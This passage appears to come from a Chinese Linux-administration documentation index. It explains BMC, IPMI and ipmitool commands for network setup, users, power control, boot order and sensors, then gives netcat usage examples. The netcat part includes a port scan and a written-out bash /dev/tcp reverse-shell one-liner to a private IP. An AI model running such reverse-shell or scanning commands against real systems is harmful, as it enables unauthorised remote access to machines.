\u4e00\u822c\u6211\u4eec\u7684\u7535\u8111\u4e0d\u4f1a\u81ea\u5e26 BMC \uff0c\u56e0\u4e3a\u7528\u5904\u4e0d\u5927\uff0c\u4e00\u4e9b\u6e29\u5ea6\u3001\u7535\u6e90\u7b49\u7684\u7ba1\u7406\uff0c\u901a\u8fc7 CPU \u6765\u63a7\u5236\u5c31\u591f\u4e86\u3002\u4f46\u662f\u5bf9\u4e8e\u7cfb\u7edf\u8981\u6c42\u9ad8\u7684\u8bbe\u5907\uff0c\u6bd4\u5982\u670d\u52a1\u5668\uff0c\u5c31\u4f1a\u7528\u5230 BMC \u3002\u53c8\u56e0\u4e3a BMC \u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u7cfb\u7edf\uff0c\u5bf9\u4e8e\u67d0\u4e9b\u5d4c\u5165\u5f0f\u8bbe\u5907\uff0c\u53ef\u80fd\u4e0d\u9700\u8981\u5176\u5b83\u5904\u7406\u5668\uff0c\u5149\u4e00\u4e2a BMC \u5c31\u80fd\u5b8c\u6210\u5de5\u4f5c\u3002 \u53ef\u89c1\uff0c BMC \u672c\u8d28\u5c31\u662f\u4e00\u4e2a\u5e26\u5904\u7406\u5668\uff08\u4e00\u822c\u90fd\u662f ARM \u5904\u7406\u5668\uff09\u7684\u5c0f\u7cfb\u7edf\uff0c\u5355\u72ec\u7528\u6765\u5904\u7406\u67d0\u4e9b\u5de5\u4f5c\u4e5f\u5b8c\u5168\u662f\u53ef\u4ee5\u7684\u3002","title":"BMC"},{"location":"linux_development/ipmi/#ipmi_1","text":"IPMI \uff08Intelligent Platform Management Interface\uff0c\u667a\u80fd\u5e73\u53f0\u7ba1\u7406\u63a5\u53e3\uff09\u662f\u4e00\u9879\u5e94\u7528\u4e8e\u670d\u52a1\u5668\u5e26\u5916\u7ba1\u7406\u7cfb\u7edf\u8bbe\u8ba1\u7684\u6807\u51c6\uff0c\u901a\u8fc7\u7279\u6709\u7684\u786c\u4ef6\u8bbe\u5907\u800c\u4e0d\u662f\u64cd\u4f5c\u7cfb\u7edf\u7f51\u7edc\u8fde\u63a5\u6765\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u7535\u6e90\u7684\u624b\u6bb5\u3002 IPMI \u80fd\u591f\u6a2a\u8de8\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u3001\u56fa\u4ef6\u548c\u786c\u4ef6\u5e73\u53f0\uff0c\u53ef\u4ee5\u667a\u80fd\u7684\u76d1\u89c6\u3001\u63a7\u5236\u548c\u4e0a\u62a5\u670d\u52a1\u5668\u7684\u8fd0\u4f5c\u72b6\u51b5\uff08e.g. \u8fdc\u7a0b\u5f00\u542f\u3001\u5173\u95ed\u7535\u6e90\uff09\u4ee5\u53ca\u5065\u5eb7\u7279\u5f81\uff08e.g. \u6e29\u5ea6\u3001\u7535\u538b\u3001\u98ce\u6247\u5de5\u4f5c\u72b6\u6001\u3001\u7535\u6e90\u72b6\u6001\u7b49\uff09\u3002 IPMI \u826f\u597d\u7684\u81ea\u6cbb\u7279\u6027\u514b\u670d\u4e86\u4ee5\u5f80\u57fa\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u7684\u7ba1\u7406\u65b9\u5f0f\u6240\u53d7\u7684\u9650\u5236\uff0c\u5b9e\u73b0\u4e86\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e0d\u54cd\u5e94\u6216\u672a\u52a0\u8f7d\u7684\u60c5\u51b5\u4e0b\u4ecd\u7136\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u5f00\u5173\u673a\u3001\u4fe1\u606f\u63d0\u53d6\u7b49\u64cd\u4f5c\u3002 OpenStack Ironic \u6b63\u662f\u5229\u7528\u6b64\u6280\u672f\u53ef\u4ee5\u8fdc\u7a0b\u7684\u5bf9\u88f8\u673a\u8fdb\u884c\u4e0a\u4e0b\u7535\u6216\u8005\u5176\u4ed6\u64cd\u4f5c\uff0c\u800c\u4e0d\u662f\u4f9d\u8d56\u7269\u7406\u5f00\u5173\u6216\u8005\u64cd\u4f5c\u7cfb\u7edf\u3002 IPMI \u7684\u6838\u5fc3\u662f BMC \uff08Baseboard Management Controller \uff0c\u57fa\u677f\u7ba1\u7406\u63a7\u5236\u5668\uff09\u3002\u5f53\u9700\u8981\u5bf9\u7cfb\u7edf\u6587\u672c\u63a7\u5236\u53f0\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\u65f6\uff0c IPMI \u7684 SOL \uff08Serial Over LAN\uff0cLAN \u4e0a\u4e32\u53e3\uff09\u529f\u80fd\u975e\u5e38\u5173\u952e\u3002 SOL \u901a\u8fc7\u5c06 IPMI \u4f1a\u8bdd\u91cd\u5b9a\u5411\u5230\u672c\u5730\u4e32\u884c\u63a5\u53e3\uff0c\u5141\u8bb8\u8fdc\u7a0b\u8bbf\u95ee Windows \u7684\u7d27\u6025\u4e8b\u4ef6\u7ba1\u7406\u63a7\u5236\u53f0\uff08EMS\uff09\u7279\u6b8a\u7ba1\u7406\u63a7\u5236\u53f0\uff08SAC\uff09\u6216\u8bbf\u95ee Linux \u7684\u4e32\u884c\u63a7\u5236\u53f0\u3002 BMC \u901a\u8fc7\u5728 LAN \u4e0a\u91cd\u5b9a\u5411\u4e32\u884c\u7aef\u53e3\u7684\u4fe1\u606f\u6765\u505a\u5230\u8fd9\u70b9\uff0c\u4ece\u800c\u63d0\u4f9b\u4e86\u4e00\u79cd\u4e0e\u670d\u52a1\u5668\u5382\u5546\u65e0\u5173\u7684\u8fdc\u7a0b\u67e5\u770b OS BootLoader \u6216\u7d27\u6025\u7ba1\u7406\u63a7\u5236\u53f0\u6765\u8bca\u65ad\u548c\u7ef4\u4fee\u6545\u969c\u7684\u6807\u51c6\u65b9\u5f0f\uff0c IPMI \u751a\u81f3\u5141\u8bb8\u5728\u64cd\u4f5c\u7cfb\u7edf\u5f15\u5bfc\u9636\u6bb5\u914d\u7f6e\u5404\u79cd\u7ec4\u4ef6\u3002","title":"IPMI"},{"location":"linux_development/ipmi/#ipmitool","text":"ipmitool \u662f\u4e00\u4e2a\u7528\u4e8e\u7ba1\u7406\u548c\u914d\u7f6e\u652f\u6301\u667a\u80fd\u5e73\u53f0\u7ba1\u7406\u63a5\u53e3\u7684\u8bbe\u5907\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002 ipmitool \u7a0b\u5e8f\u4e3a BMC \u63d0\u4f9b\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u547d\u4ee4\u884c\u754c\u9762\u3002\u5b83\u5177\u6709\u8bfb\u53d6\u4f20\u611f\u5668\u6570\u636e\u5b58\u50a8\u5e93 (sensor data repository\uff0c\u7b80\u79f0SDR) \u548c\u6253\u5370\u4f20\u611f\u5668\u503c\u3001\u663e\u793a\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7 (System Event Log\uff0c\u7b80\u79f0SEL) \u7684\u5185\u5bb9\u3001\u6253\u5370\u73b0\u573a\u53ef\u66f4\u6362\u5355\u5143 (Field Replaceable Unit\uff0c\u7b80\u79f0FRU) \u5e93\u5b58\u4fe1\u606f\u3001\u8bfb\u53d6\u548c\u8bbe\u7f6e LAN \u914d\u7f6e\u53c2\u6570\u4ee5\u53ca\u6267\u884c\u8fdc\u7a0b\u673a\u7bb1\u7535\u6e90\u63a7\u5236\u3002 IPMItool \u4e3b\u9875: http://github.com/ipmitool/ipmitool \u667a\u80fd\u5e73\u53f0\u7ba1\u7406\u63a5\u53e3\u89c4\u8303: https://www.intel.com/content/www/us/en/servers/ipmi/ipmi-home.html OpenIPMI \u9879\u76ee\uff1aLinux IPMI \u5185\u6838\u9a71\u52a8\u7a0b\u5e8f\u548c\u7528\u6237\u6001\u5e93 http://openipmi.sourceforge.net","title":"ipmitool"},{"location":"linux_development/ipmi/#background","text":"Sun Microsystems \u521a\u521a\u5f00\u59cb\u5f00\u53d1\u65b0\u7684\u901a\u7528 x86 \u670d\u52a1\u5668\u7cfb\u5217\uff0c\u5176\u4e2d\u5305\u62ec\u4e00\u4e2a\u5e26\u6709 IPMIv1.5 BMC \u7684 OEM Intel \u4e3b\u677f\u3002 ipmitool \u6700\u521d\u7684\u4f5c\u8005\u5f00\u59cb\u7684\u60f3\u6cd5\u662f\u8fdc\u7a0b\u673a\u7bb1\u7535\u6e90\u63a7\u5236\u4f1a\u5f88\u65b9\u4fbf\u5728\u5b9e\u9a8c\u5ba4\u4e2d\u4e3a\u4ed6\u7684\u7cfb\u7edf\u63d0\u4f9b\u7684\u529f\u80fd\uff0c\u5e76\u4ece\u90a3\u91cc\u53d1\u5c55\u6210\u4e3a\u4e00\u4e2a\u591a\u529f\u80fd\u5de5\u5177\uff0c\u5f88\u591a\u4eba\u90fd\u89c9\u5f97\u5b83\u5f88\u6709\u7528\u3002\u4ed6\u51b3\u5b9a\u5728 BSD \u8bb8\u53ef\u4e0b\u53d1\u5e03\u5b83\uff0c\u5e76\u8ba9\u5176\u4ed6\u4eba\u6709\u673a\u4f1a\u4f7f\u7528\u5b83\u3002 ipmitool \u4e0d\u662f\u4e3a\u4e86\u63d0\u4f9b\u5927\u89c4\u6a21\uff08\u53c8\u540d\u4f01\u4e1a\uff09\u7ba1\u7406\u5e94\u7528\u7a0b\u5e8f\u529f\u80fd\u800c\u7f16\u5199\u7684\u3002 ipmitool \u63d0\u4f9b\u7684\u529f\u80fd\u5f88\u5bb9\u6613\u901a\u8fc7\u53d1\u9001\u7b80\u5355\u7684 IPMI \u8bf7\u6c42\u6d88\u606f\u5e76\u89e3\u6790\u8fd4\u56de\u7684\u54cd\u5e94\u6765\u5b8c\u6210\u3002\u5b83\u65e8\u5728\u4f9b\u559c\u6b22\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\u7684\u7b80\u5355\u6027\u548c\u53ef\u7f16\u5199\u811a\u672c\u7684\u7cfb\u7edf\u7ba1\u7406\u5458\u4ee5\u53ca\u8c03\u8bd5\u6216\u5f00\u53d1\u81ea\u5df1\u7684 BMC \u5b9e\u73b0\u7684\u7cfb\u7edf\u7ba1\u7406\u5458\u4f7f\u7528\u3002","title":"\u80cc\u666f"},{"location":"linux_development/ipmi/#requirements","text":"\u663e\u7136\uff0c\u6700\u5927\u7684\u8981\u6c42\u662f\u5177\u6709\u652f\u6301 IPMI \u89c4\u8303\u7684\u670d\u52a1\u5904\u7406\u5668\u7684\u786c\u4ef6\u3002\u8bb8\u591a\u57fa\u4e8e x86 \u7684\u670d\u52a1\u5668\u73b0\u5728\u90fd\u63d0\u4f9b IPMI \u652f\u6301\uff0c\u8bf7\u5411\u60a8\u9996\u9009\u7684\u786c\u4ef6\u4f9b\u5e94\u5546\u54a8\u8be2\u53ef\u7528\u4ea7\u54c1\u3002 \u4e00\u65e6\u60a8\u786e\u5b9a\u62e5\u6709\u6240\u9700\u7684\u786c\u4ef6\uff0c\u60a8\u5c31\u9700\u8981\u51b3\u5b9a\u5982\u4f55\u8bbf\u95ee BMC \u3002\u6700\u5e38\u89c1\u7684\u60c5\u51b5\u662f\u901a\u8fc7\u7cfb\u7edf\u63a5\u53e3\u6216 LAN \u8fdb\u884c\u8bbf\u95ee\u3002\uff08\u6216 serial \uff0c\u4f46\u76ee\u524d ipmitool \u4e0d\u652f\u6301 serial \u63a5\u53e3\uff09","title":"\u8981\u6c42"},{"location":"linux_development/ipmi/#system-interface","text":"\u7cfb\u7edf\u63a5\u53e3\u6709\u591a\u79cd\u7c7b\u578b\uff0c\u4f46\u90fd\u8db3\u591f\u76f8\u4f3c\uff0c\u5141\u8bb8\u5355\u4e00\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u9a71\u52a8\u7a0b\u5e8f\u6765\u652f\u6301\u5b83\u4eec\u3002\u4e0d\u540c\u7c7b\u578b\u7684\u7cfb\u7edf\u63a5\u53e3\u5305\u62ec\u952e\u76d8\u63a7\u5236\u5668\u6837\u5f0f(KCS)\u3001\u5757\u4f20\u8f93 (BT)\u3001\u7cfb\u7edf\u7ba1\u7406\u63a5\u53e3\u82af\u7247 (SMIC) \u548c SMBus\u3002\u4e0d\u540c\u7684\u786c\u4ef6\u4f9b\u5e94\u5546\u4f1a\u6709\u4e0d\u540c\u7684\u504f\u597d\u548c\u5b9e\u73b0\u3002 \u5728 Linux \u4e0a\uff0c OpenIPMI \u5185\u6838\u9a71\u52a8\u7a0b\u5e8f\u5e94\u8be5\u652f\u6301\u6240\u6709\u8fd9\u4e9b\u7cfb\u7edf\u63a5\u53e3\uff0c\u5e76\u4e14\u52a0\u8f7d\u6b63\u786e\u7684\u5185\u6838\u6a21\u5757\u5e76\u8bbe\u7f6e\u8bbe\u5907\u8282\u70b9\u4ee5\u4f7f\u7528\u5b83\u5e94\u8be5\u662f\u4e00\u4ef6\u7b80\u5355\u7684\u4e8b\u60c5\u3002\u9a71\u52a8\u7a0b\u5e8f\u6a21\u5757\u540d\u79f0\u5728\u4e0d\u540c\u5185\u6838\u7248\u672c\u4e2d\u7565\u6709\u4e0d\u540c\uff0c\u4f46\u5bf9\u4e8e\u6240\u6709\u7248\u672c\uff0c\u60a8\u90fd\u9700\u8981\u8fd9\u4e24\u4e2a\u6a21\u5757\uff1a ipmi_msghandler\uff1a\u4f20\u5165\u548c\u4f20\u51fa\u6d88\u606f\u5904\u7406\u7a0b\u5e8f ipmi_devintf\uff1aIPMI \u9a71\u52a8\u7a0b\u5e8f\u7684\u5b57\u7b26\u8bbe\u5907\u63a5\u53e3 \u5bf9\u4e8e 2.4.x \u548c\u65e9\u671f\u7684 2.6.x \u5185\u6838\uff0c\u60a8\u9700\u8981\u6839\u636e\u786c\u4ef6\u652f\u6301\u7684\u7cfb\u7edf\u63a5\u53e3\u7c7b\u578b\u9009\u62e9\u6a21\u5757\u3002\u4f8b\u5982\uff1a ipmi_kcs_drv\uff1a\u952e\u76d8\u63a7\u5236\u5668\u6837\u5f0f\u9a71\u52a8\u7a0b\u5e8f \u6700\u65b0\u7684 2.6.x \u5185\u6838\u5df2\u5c06\u5b83\u4eec\u7ec4\u5408\u6210\u4e00\u4e2a\u6a21\u5757\uff1a ipmi_si\uff1a\u901a\u7528 IPMI \u7cfb\u7edf\u63a5\u53e3\u9a71\u52a8\u7a0b\u5e8f \u6709\u5173\u54ea\u4e9b\u5185\u6838\u6a21\u5757\u662f\u5fc5\u987b\u7684\uff0c\u66f4\u591a\u4fe1\u606f\u8bf7\u53c2\u9605\u60a8\u7684\u53d1\u884c\u7248\u548c/\u6216\u5185\u6838\u968f\u9644\u7684\u6587\u6863\u3002\u4e00\u65e6\u52a0\u8f7d\u4e86\u6240\u9700\u7684\u6a21\u5757\u5e76\u4e14\u9a71\u52a8\u7a0b\u5e8f\u627e\u5230\u4e86\u9002\u5408 BMC \u7684\u7cfb\u7edf\u63a5\u53e3\uff0c\u90a3\u4e48\u60a8\u9700\u8981\u786e\u4fdd /dev/ipmi0 \u5904\u7684\u8bbe\u5907\u8282\u70b9\u6307\u5411\u6b63\u786e\u7684\u4e3b\u8bbe\u5907\u53f7\u3002 \u8fd9\u662f\u56e0\u4e3a\u5f53\u5b83\u88ab\u52a0\u8f7d\u65f6 OpenIPMI \u88ab\u8d4b\u4e88\u4e86\u4e00\u4e2a\u52a8\u6001\u5206\u914d\u7684\u4e3b\u7f16\u53f7\uff0c\u4f46\u53d6\u51b3\u4e8e\u5b58\u5728\u7684\u5176\u4ed6\u6a21\u5757\uff0c\u8fd9\u4e2a\u6570\u5b57\u53ef\u80fd\u662f\u4ece 254 \u5f00\u59cb\u3002\u6700\u7b80\u5355\u7684\u5224\u65ad\u65b9\u6cd5\u662f\u68c0\u67e5 /proc/devices \u7684\u8f93\u51fa\u5e76\u67e5\u770b\u201cipmidev\u201d\u8bbe\u5907\u5206\u914d\u7ed9\u54ea\u4e2a\u4e3b\u7f16\u53f7\u3002 ipmitool \u5305\u542b\u4e00\u4e2a\u540d\u4e3a ipmi.init \u7684\u793a\u4f8b\u811a\u672c\uff0c\u53ef\u7528\u4e8e\u5728\u542f\u52a8\u65f6\u81ea\u52a8\u6267\u884c\u6b64\u8fc7\u7a0b\u3002","title":"\u7cfb\u7edf\u63a5\u53e3"},{"location":"linux_development/ipmi/#install","text":"$ sudo apt install ipmitool \u4ece\u6e90\u7801\u7f16\u8bd1\u5b89\u88c5\u8bf7\u53c2\u8003: https://github.com/ipmitool/ipmitool/blob/master/INSTALL","title":"\u5b89\u88c5"},{"location":"linux_development/ipmi/#usage","text":"ipmitool \u7684\u6240\u6709\u8c03\u7528\u90fd\u9700\u8981\u6307\u5b9a\u8981\u4f7f\u7528\u7684\u63a5\u53e3\uff0c\u9664\u975e\u60a8\u60f3\u4f7f\u7528\u5728\u7f16\u8bd1\u65f6\u8bbe\u7f6e\u7684\u9ed8\u8ba4\u63a5\u53e3\u3002\u6bcf\u4e2a\u8c03\u7528\u8fd8\u5fc5\u987b\u6307\u5b9a\u8981\u8fd0\u884c\u7684\u547d\u4ee4\u3002\u60a8\u53ef\u4ee5\u5728\u4f7f\u7528 -h \u9009\u9879\u7684\u4f7f\u7528\u8f93\u51fa\u4e2d\u67e5\u770b\u652f\u6301\u7684\u63a5\u53e3\u5217\u8868\u548c\u9ed8\u8ba4\u63a5\u53e3\u5217\u8868\u4ee5\u53ca\u9876\u7ea7\u547d\u4ee4\u5217\u8868\uff1a usage: ipmitool [options...] <command> -h This help -V Show version information -v Verbose (can use multiple times) -c Display output in comma separated format -I intf Interface to use -H hostname Remote host name for LAN interface -p port Remote RMCP port [default=623] -L level Remote session privilege level [default=USER] -A authtype Force use of authtype NONE, PASSWORD, MD2 or MD5 -U username Remote session username -P password Remote session password -f file Read remote session password from file -a Prompt for remote password -E Read password from IPMI_PASSWORD environment variable -m address Set local IPMB address -t address Bridge request to remote target address Interfaces: open Linux OpenIPMI Interface [default] imb Intel IMB Interface lan IPMI v1.5 LAN Interface lanplus IPMI v2.0 RMCP+ LAN Interface Commands: raw Send a RAW IPMI request and print response lan Configure LAN Channels chassis Get chassis status and set power state event Send pre-defined events to BMC bmc Print BMC status and configure global enables sdr Print Sensor Data Repository entries and readings sensor Print detailed sensor information fru Print built-in FRU and scan SDR for FRU locators sel Print System Evelnt Log sol Configure IPMIv2.0 Serial-over-LAN user Configure BMC users channel Configure BMC channels session Print session information shell Launch interactive IPMI shell exec Run list of commands from file set Set runtime variable for shell and exec","title":"\u7528\u6cd5"},{"location":"linux_development/ipmi/#ipmi-examples","text":"\u5f00\u59cb\u4f7f\u7528 IPMI \u547d\u4ee4\u3002","title":"ipmitool\u8fd0\u7ef4\u7ba1\u7406\u793a\u4f8b"},{"location":"linux_development/ipmi/#modprobe-kernel-modules","text":"root@dbtuserver:~# modprobe ipmi_msghandler root@dbtuserver:~# modprobe ipmi_devintf root@dbtuserver:~# modprobe ipmi_si root@dbtuserver:~# lsmod | grep ipmi ipmi_ssif 36864 0 ipmi_si 65536 0 ipmi_devintf 20480 0 ipmi_msghandler 106496 3 ipmi_devintf,ipmi_si,ipmi_ssif","title":"\u542f\u52a8\u76f8\u5e94\u5185\u6838\u6a21\u5757"},{"location":"linux_development/ipmi/#ipaddr-managerment","text":"\u547d\u4ee4\u683c\u5f0f\u5982\u4e0b: ipmitool lan print [<channel number>] ipmitool lan set <channel number> <command> <parameter> # \u8bbe\u7f6e\u9759\u6001IP\u5730\u5740 root@dbtuserver:~# ipmitool lan set 1 ipsrc static # \u8bbe\u7f6eIP\u5730\u5740 root@dbtuserver:~# ipmitool lan set 1 ipaddr 192.168.0.110 # \u8bbe\u7f6e\u5b50\u7f51\u63a9\u7801 root@dbtuserver:~# ipmitool lan set 1 netmask 255.255.255.0 # \u8bbe\u7f6e\u7f51\u5173\u5730\u5740 root@dbtuserver:~# ipmitool lan set 1 defgw ipaddr 192.168.0.1 # \u67e5\u770b\u5e26\u5916\u7ba1\u7406IP\u5730\u5740 root@dbtuserver:~# ipmitool lan print 1 Set in Progress : Set Complete Auth Type Support : MD5 Auth Type Enable : Callback : MD5 : User : MD5 : Operator : MD5 : Admin : MD5 : OEM : MD5 IP Address Source : Static Address IP Address : 192.168.0.110 Subnet Mask : 255.255.255.0 MAC Address : 04:d9:f5:50:f9:b6 SNMP Community String : AMI IP Header : TTL=0x40 Flags=0x40 Precedence=0x00 TOS=0x10 BMC ARP Control : ARP Responses Enabled, Gratuitous ARP Disabled Gratituous ARP Intrvl : 0.0 seconds Default Gateway IP : 192.168.0.1 Default Gateway MAC : 8c:16:45:14:31:4c Backup Gateway IP : 0.0.0.0 Backup Gateway MAC : 00:00:00:00:00:00 802.1q VLAN ID : Disabled 802.1q VLAN Priority : 0 RMCP+ Cipher Suites : 0,1,2,3,6,7,8,11,12,15,16,17 Cipher Suite Priv Max : XaaaaaaaaaaaXXX : X=Cipher Suite Unused : c=CALLBACK : u=USER : o=OPERATOR : a=ADMIN : O=OEM Bad Password Threshold : 0 Invalid password disable: no Attempt Count Reset Int.: 0 User Lockout Interval : 0","title":"\u5e26\u5916\u7ba1\u7406IP\u5730\u5740"},{"location":"linux_development/ipmi/#ipmi-user-password","text":"\u547d\u4ee4\u683c\u5f0f\u5982\u4e0b: ipmitool user summary [<channel number>] ipmitool user list [<channel number>] ipmitool user set name <user id> <username> ipmitool user set password <user id> [<password> <16|20>] ipmitool user disable <user id> ipmitool user enable <user id> ipmitool user priv <user id> <privilege level> [<channel number>] ipmitool user Privilege levels: ipmitool user * 0x1 - Callback ipmitool user * 0x2 - User ipmitool user * 0x3 - Operator ipmitool user * 0x4 - Administrator ipmitool user * 0x5 - OEM Proprietary ipmitool user * 0xF - No Accipmitool user ipmitool user test <user id> <16|20> [<password]> # \u8bbe\u7f6e\u7528\u6237\"admin\"(ID\u4e3a2)\u7684\u5bc6\u7801\u4e3a\"dbtu2017\" root@dbtuserver:~# ipmitool user set password 2 dbtu2017 Set User Password command successful (user 2) # \u67e5\u8be2\u6240\u6709\u7528\u6237\u5217\u8868 root@dbtuserver:~# ipmitool user list 1 ID Name Callin Link Auth IPMI Msg Channel Priv Limit 1 false false true ADMINISTRATOR 2 admin false false true ADMINISTRATOR 3 true false false NO ACCESS 4 true false false NO ACCESS 5 true false false NO ACCESS 6 true false false NO ACCESS 7 true false false NO ACCESS 8 true false false NO ACCESS 9 true false false NO ACCESS 10 true false false NO ACCESS","title":"\u5e26\u5916\u7ba1\u7406\u7528\u6237\u5bc6\u7801"},{"location":"linux_development/ipmi/#power-managerment","text":"ipmitool [chassis] \u547d\u4ee4 \u63cf\u8ff0 ipmitool [chassis] power status \u83b7\u53d6\u7535\u6e90\u72b6\u6001 ipmitool [chassis] power on \u786c\u5f00\u673a ipmitool [chassis] power off \u786c\u65ad\u7535\u5173\u673a ipmitool [chassis] power soft \u901a\u8fc7acpi\u8fdb\u884c\u8f6f\u5173\u673a\uff0c\u5982\u540c\u8f7b\u6309\u4e00\u4e0b\u5f00\u673a\u952e ipmitool [chassis] power reset \u786c\u91cd\u542f ipmitool [chassis] power cycle \u5f3a\u5236\u5173\u95ed\u7535\u6e90\uff0c\u7b49\u5f851\u79d2\u7136\u540e\u518d\u6253\u5f00\u7535\u6e90\u7684\u7ec4\u5408 # \u547d\u4ee4\u5e2e\u52a9 root@dbtuserver:~# ipmitool chassis power help chassis power Commands: status, on, off, cycle, reset, diag, soft root@dbtuserver:~# ipmitool power status Chassis Power is on # ipmitool -H 192.168.0.110 -U admin -P dbtu2017 chassis power off Chassis Power Control: Down/Off # ipmitool -H 192.168.0.110 -U admin -P dbtu2017 chassis power on Chassis Power Control: Up/On","title":"ipmitool \u7535\u6e90\u7ba1\u7406"},{"location":"linux_development/ipmi/#bootdev-order","text":"# \u547d\u4ee4\u5e2e\u52a9 root@dbtuserver:~# ipmitool chassis bootdev help bootdev <device> [clear-cmos=yes|no] bootdev <device> [options=help,...] none : Do not change boot device order pxe : Force PXE boot disk : Force boot from default Hard-drive safe : Force boot from default Hard-drive, request Safe Mode diag : Force boot from Diagnostic Partition cdrom : Force boot from CD/DVD bios : Force boot into BIOS Setup floppy: Force boot from Floppy/primary removable media # PXE\u5f15\u5bfc\u542f\u52a8 ipmitool -I lan -H <server_ip> -U root -P passwd chassis bootdev pxe # \u4ece\u786c\u76d8\u5f15\u5bfc\u542f\u52a8 ipmitool -I lan -H <server_ip> -U root -P passwd chassis bootdev disk # \u4eceCD/DVD\u5f15\u5bfc\u542f\u52a8 ipmitool -I lan -H <server_ip> -U root -P passwd chassis bootdev cdrom","title":"\u4fee\u6539\u670d\u52a1\u5668\u5f15\u5bfc\u542f\u52a8\u987a\u5e8f"},{"location":"linux_development/ipmi/#show-sdr","text":"root@dbtuserver:~# ipmitool sdr [list] CPU1 Temperature | 39 degrees C | ok CPU2 Temperature | 38 degrees C | ok PSU1 Over Temp | 0x00 | ok PSU2 Over Temp | 0x00 | ok TR1 Temperature | 26 degrees C | ok TR2 Temperature | 55 degrees C | ok TR3 Temperature | 25 degrees C | ok DIMMA1_Temp | 32 degrees C | ok DIMMA2_Temp | 0 degrees C | nr DIMMB1_Temp | 0 degrees C | nr DIMMC1_Temp | 0 degrees C | nr DIMMD1_Temp | 33 degrees C | ok DIMMD2_Temp | 0 degrees C | nr DIMME1_Temp | 0 degrees C | nr DIMMF1_Temp | 0 degrees C | nr DIMMG1_Temp | 31 degrees C | ok DIMMG2_Temp | 0 degrees C | nr DIMMH1_Temp | 0 degrees C | nr DIMMJ1_Temp | 0 degrees C | nr DIMMK1_Temp | 31 degrees C | ok DIMMK2_Temp | 0 degrees C | nr DIMML1_Temp | 0 degrees C | nr DIMMM1_Temp | 0 degrees C | nr CPU1_ECC1 | 0x00 | ok CPU2_ECC1 | 0x00 | ok +VCCIO1 | 0.99 Volts | ok +VCCIO2 | 0.99 Volts | ok +VCORE1 | 1.78 Volts | ok +VCORE2 | 1.78 Volts | ok +VDDQ_ABC_CPU1 | 1.22 Volts | ok +VDDQ_DEF_CPU1 | 1.22 Volts | ok +VDDQ_GHJ_CPU2 | 1.21 Volts | ok +VDDQ_KLM_CPU2 | 1.22 Volts | ok +12V | 11.89 Volts | ok +5V | 5.04 Volts | ok +3.3V | 3.31 Volts | ok +5VSB | 5.06 Volts | ok +3.3VSB | 3.30 Volts | ok VBAT | 3.12 Volts | ok PMBPower1 | 216 Watts | ok PMBPower2 | 184 Watts | ok PSU1 AC Lost | 0x00 | ok PSU2 AC Lost | 0x00 | ok PSU1 PWR Detect | 0x00 | ok PSU2 PWR Detect | 0x00 | ok CPU_CATERR | 0x00 | ok Memory_Train_ERR | 0x00 | ok FRNT_FAN1 | 3000 RPM | ok FRNT_FAN2 | 3300 RPM | ok FRNT_FAN3 | 3200 RPM | ok FRNT_FAN4 | 3200 RPM | ok FRNT_FAN5 | 3000 RPM | ok FRNT_FAN6 | 3000 RPM | ok FRNT_FAN7 | 0 RPM | nr PSU1 Slow FAN1 | 0x00 | ok PSU2 Slow FAN1 | 0x00 | ok Backplane1 HD01 | 0x00 | ok Backplane1 HD02 | 0x00 | ok Backplane1 HD03 | 0x00 | ok Backplane1 HD04 | 0x00 | ok Backplane1 HD05 | 0x00 | ok Backplane1 HD06 | 0x00 | ok Backplane1 HD07 | 0x00 | ok Backplane1 HD08 | 0x00 | ok NM Capabilities | 0x00 | ok Watchdog2 | 0x00 | ok","title":"\u67e5\u770b\u76f8\u5173\u7684\u4f20\u611f\u5668\u4fe1\u606f"},{"location":"linux_development/nc/","text":"nc \uf0c1 1.\u7aef\u53e3\u626b\u63cf \uf0c1 nc -z -v -n 192.168.21.135 1-100 z\u53c2\u6570\u544a\u8bc9nc\u4f7f\u75280 \u8f93\u5165/\u8f93\u51fa\u6a21\u5f0f\uff0c\u4e00\u822c\u5728\u626b\u63cf\u901a\u4fe1\u7aef\u53e3\u7684\u65f6\u5019\u4f7f\u7528 v\u53c2\u6570\u663e\u793a\u6307\u4ee4\u6267\u884c\u8fc7\u7a0b n\u53c2\u6570\u544a\u8bc9nc\u4e0d\u4f7f\u7528DNS\u53cd\u5411\u67e5\u8be2ip\u5730\u5740\u7684\u57df\u540d $ nc -z -v -n 192.168.122.135 1-100 nc: connect to 192.168.122.135 port 21 (tcp) failed: Connection refused Connection to 192.168.122.135 22 port [tcp/*] succeeded! 2.\u505a\u4e3a\u901a\u4fe1\u4f7f\u7528 \uf0c1 server: nc -l 5555 client: nc 192.168.21.133 5555 l\u53c2\u6570\u4f7f\u7528\u76d1\u542c\u6a21\u5f0f\uff0c\u7ba1\u63a7\u4f20\u5165\u7684\u8d44\u6599 3.\u6587\u4ef6\u4f20\u8f93 \uf0c1 server: nc -l 5555< aa.txt client: nc -n 192.168.21.133 >aa.txt \u540c\u6837\u4e5f\u53ef\u4ee5\u4e92\u6362\uff0c\u4f20\u8f93\u6587\u4ef6 server: nc -l 5555 > aa.txt client: nc 192.168.21.133 5555 < aa.txt 4.\u76ee\u5f55\u4f20\u8f93 \uf0c1 \u6587\u4ef6\u53ef\u4ee5\u53d1\u9001\uff0c\u4f46\u662f\u76ee\u5f55\u4e5f\u540c\u6837\u53ef\u4ee5\u4f20\u8f93\uff0c\u5229\u7528\u7ba1\u9053\u4f20\u8f93\u8d77\u6765\u3002 server: tar -czvf- faith/ |nc -l 5555 client: nc -n 192.168.21.133 5555 | tar -zxvf - 5.\u52a0\u5bc6\u4f20\u8f93 \uf0c1 server: nc localhost 1567 | mcrypt \u2013flush \u2013bare -F -q -d -m ecb > file.txt client: mcrypt \u2013flush \u2013bare -F -q -m ecb < file.txt | nc -l 1567 6.\u5efa\u7acbshell \uf0c1 server: nc -lvp 5555 bash -i >& /dev/tcp/192.168.21.136/5555 0 >&1 client: nc -lvp 5555 \u8fd8\u6709\u4e00\u79cd\uff1a server: nc -e 